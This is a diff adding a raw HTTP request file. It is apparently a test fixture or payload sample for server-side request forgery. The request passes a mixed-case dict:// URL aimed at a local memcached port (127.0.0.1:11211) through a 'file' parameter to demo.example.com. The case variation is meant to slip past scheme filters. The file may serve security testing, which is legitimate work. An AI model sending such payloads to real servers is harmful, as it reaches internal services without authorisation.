@@ -1,0 +1,4 @@
+GET /a?file=dIcT://127.0.0.1:11211/sTaT HTTP/1.1
+Host: demo.example.com
+Connection: close
+
